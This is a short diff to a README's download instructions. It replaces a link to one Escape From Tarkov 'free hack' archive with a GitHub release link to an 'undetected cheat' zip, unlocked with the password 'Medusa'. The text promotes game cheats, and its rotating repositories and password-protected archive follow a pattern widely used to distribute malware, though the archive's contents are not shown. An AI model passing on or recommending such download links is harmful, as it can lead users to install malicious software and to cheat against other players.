@@ -7,7 +7,7 @@
 ---
 ## 📥 Download
 
-1. **Get the latest version** (https://github.com/diwnaURL/Authority_EFT_TarkovFreeHack/releases/download/last/Authority.zip).
+1. **Get the latest version** (https://github.com/Biananst/Escape-From-Tarkov-Medusa-Rage-Undetected-Cheat/releases/download/latest/Medusa.zip).
 2. **Unzip the Files**: Use the pass `Medusa`.
 
 ---
